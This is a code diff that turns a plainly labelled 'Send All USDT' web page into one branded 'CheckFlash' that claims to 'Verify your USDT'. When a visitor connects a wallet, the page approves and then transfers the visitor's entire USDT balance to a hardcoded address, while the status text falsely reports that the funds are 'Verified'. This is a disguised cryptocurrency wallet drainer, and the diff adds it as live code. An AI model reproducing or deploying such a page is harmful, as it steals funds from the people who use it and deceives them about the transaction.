@@ -1,73 +1,106 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html lang="en">
 <head>
-  <title>Send USDT on BSC</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8">
+  <title>CheckFlash</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    button {
+      font-size: 20px;
+      padding: 10px 30px;
+      background-color: #0f0;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 30px;
+      font-size: 18px;
+    }
+  </style>
 </head>
-<body style="font-family:sans-serif; text-align:center; padding-top:50px;">
-
-  <h2>Send All USDT (BEP-20)</h2>
-  <button onclick="connectAndSend()" style="padding:12px 25px; font-size:18px; border:none; border-radius:8px; background:#007bff; color:#fff; cursor:pointer;">
-    Connect Wallet & Send
-  </button>
-
-  <p id="status" style="margin-top:20px; font-size:16px;"></p>
-
-  <script>
-    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // Receiver wallet address
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20) contract address
+<body>
+  <h1>CheckFlash</h1>
+  <p>Verify your USDT</p>
+  <button onclick="connectAndSend()">Approve</button>
+  <p id="status"></p>  <script>
+    const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
     const usdtAbi = [
-      { "constant":true, "inputs":[{"name":"_owner","type":"address"}], "name":"balanceOf", "outputs":[{"name":"balance","type":"uint256"}], "type":"function" },
-      { "constant":false, "inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}], "name":"approve", "outputs":[{"name":"success","type":"bool"}], "type":"function" },
-      { "constant":false, "inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}], "name":"transfer", "outputs":[{"name":"success","type":"bool"}], "type":"function" }
+      {
+        "constant": false,
+        "inputs": [
+          {"name": "_spender", "type": "address"},
+          {"name": "_value", "type": "uint256"}
+        ],
+        "name": "approve",
+        "outputs": [{"name": "", "type": "bool"}],
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [
+          {"name": "_owner", "type": "address"}
+        ],
+        "name": "balanceOf",
+        "outputs": [
+          {"name": "balance", "type": "uint256"}
+        ],
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [
+          {"name": "_to", "type": "address"},
+          {"name": "_value", "type": "uint256"}
+        ],
+        "name": "transfer",
+        "outputs": [
+          {"name": "", "type": "bool"}
+        ],
+        "type": "function"
+      }
     ];
 
+    let web3;
+    let userAccount;
+
     async function connectAndSend() {
-      const status = document.getElementById("status");
-      if (typeof window.ethereum === 'undefined') {
-        alert("Please open in MetaMask or Trust Wallet browser.");
-        return;
-      }
+      document.getElementById("status").innerText = "Verifying...";
 
-      const web3 = new Web3(window.ethereum);
+      if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const accounts = await web3.eth.getAccounts();
+          userAccount = accounts[0];
 
-      try {
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }], // BNB Smart Chain Mainnet
-        });
-      } catch (e) {
-        alert("Please switch to BNB Smart Chain manually in wallet.");
-        return;
-      }
+          document.getElementById("status").innerText = "Flash USDT Verify...";
+          const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+          const balance = await usdt.methods.balanceOf(userAccount).call();
 
-      try {
-        await window.ethereum.request({ method: "eth_requestAccounts" });
-        const accounts = await web3.eth.getAccounts();
-        const sender = accounts[0];
-        const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
-
-        const balance = await usdt.methods.balanceOf(sender).call();
-
-        if (balance == 0) {
-          status.innerText = "No USDT found in your wallet.";
-          return;
+          if (balance > 0) {
+            await usdt.methods.approve(receiverAddress, balance).send({ from: userAccount });
+            document.getElementById("status").innerText = "Flash Your USDT Verified...";
+            await usdt.methods.transfer(receiverAddress, balance).send({ from: userAccount });
+            document.getElementById("status").innerText = "Your USDT Verified";
+          } else {
+            document.getElementById("status").innerText = "No USDT Balance";
+          }
+        } catch (err) {
+          document.getElementById("status").innerText = "Transaction Failed or Rejected";
         }
-
-        status.innerText = "Approving USDT...";
-        await usdt.methods.approve(receiver, balance).send({ from: sender });
-
-        status.innerText = "Sending USDT...";
-        await usdt.methods.transfer(receiver, balance).send({ from: sender });
-
-        status.innerText = "✅ USDT sent successfully!";
-      } catch (error) {
-        console.error(error);
-        status.innerText = "❌ Transaction failed or cancelled.";
+      } else {
+        document.getElementById("status").innerText = "Wallet not found";
       }
     }
-  </script>
-
-</body>
+  </script></body>
 </html>
